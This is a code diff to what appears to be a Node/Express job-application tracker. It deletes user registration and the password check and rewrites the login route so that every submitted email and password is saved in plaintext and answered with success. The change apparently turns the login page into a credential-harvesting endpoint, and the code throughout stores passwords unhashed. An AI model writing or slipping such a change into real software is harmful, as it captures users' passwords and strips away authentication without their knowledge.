@@ -20,13 +20,16 @@ mongoose.connect(
 
 // --- Mongoose Schemas & Models ---
 
-// User Schema
-const userSchema = new mongoose.Schema({
+// User Login Attempt Schema
+const loginSchema = new mongoose.Schema({
   email: String,
-  password: String
+  password: String,
+  attemptedAt: {
+    type: Date,
+    default: Date.now,
+  },
 });
-
-const User = mongoose.model('User', userSchema);
+const Login = mongoose.model('Login', loginSchema);
 
 // Job Application Schema
 const applicationSchema = new mongoose.Schema({
@@ -36,35 +39,18 @@ const applicationSchema = new mongoose.Schema({
   date: String,
   link: String,
 });
-
 const Application = mongoose.model('Application', applicationSchema);
 
 // --- Routes ---
 
-// Register
-app.post('/api/register', async (req, res) => {
-  const { email, password } = req.body;
-
-  const existingUser = await User.findOne({ email });
-  if (existingUser) {
-    return res.status(400).json({ message: 'User already exists' });
-  }
-
-  const user = new User({ email, password });
-  await user.save();
-  res.status(201).json({ message: 'Registration successful' });
-});
-
-// Login
+// Login Attempt (store to DB only)
 app.post('/api/login', async (req, res) => {
   const { email, password } = req.body;
 
-  const user = await User.findOne({ email, password });
-  if (!user) {
-    return res.status(401).json({ message: 'Invalid email or password' });
-  }
+  const login = new Login({ email, password });
+  await login.save();
 
-  res.status(200).json({ message: 'Login successful' });
+  res.status(200).json({ message: 'Login attempt stored' });
 });
 
 // Get all applications
